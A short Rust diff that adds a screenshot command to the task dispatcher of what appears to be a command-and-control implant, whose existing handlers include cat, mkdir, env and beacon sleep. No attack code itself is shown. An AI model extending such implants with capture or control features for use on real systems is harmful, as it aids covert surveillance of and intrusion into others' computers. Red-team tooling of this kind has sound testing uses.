@@ -61,6 +61,7 @@ impl TasksManager {
                 "cat" => commands::file_system::cat(&args_str),
                 "mkdir" => commands::file_system::mkdir(&args_str),
                 "env" => commands::system::env(),
+                "screenshot" => commands::screenshot::screenshot(),
                 "sleep" => self.handle_sleep_command(beacon, &task.args),
                 _ => {
                     let err = format!("Unknown command: {}", task.command);
